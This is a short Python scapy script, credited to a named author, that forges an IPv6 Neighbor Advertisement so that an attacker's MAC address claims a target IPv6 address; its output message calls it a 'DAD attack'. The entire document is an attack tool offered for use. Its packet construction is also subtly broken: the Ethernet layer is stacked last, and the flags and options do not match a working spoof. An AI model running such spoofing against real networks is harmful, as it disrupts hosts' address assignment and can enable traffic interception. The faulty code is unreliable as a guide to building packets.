from scapy.all import *
# Written by Lithiokride

# Define the target parameters
target_ipv6 = "2001:db8::1"  # IPv6 address to claim
attacker_mac = "00:11:22:33:44:55"  # Attacker's MAC address
target_mac = "aa:bb:cc:dd:ee:ff"  # Target device's MAC address

# Create a Neighbor Advertisement packet
na_packet = IPv6(dst=target_ipv6) / ICMPv6ND_NA(
    tgt=target_ipv6,  # Target IPv6 address
    R=0,              # Router flag (0 means not a router)
    S=1,              # Solicited flag (1 means this is a response to a solicitation)
    O=0               # Override flag (0 means this is not an override)
) / Ether(src=attacker_mac, dst=target_mac)  # Set the source to the attacker's MAC

# Send the packet
sendp(na_packet, iface="eth0", verbose=1)  # Specify your interface (e.g., "eth0")

# Print a custom message
print(f"Sent DAD attack packet claiming {target_ipv6} is at {attacker_mac}")
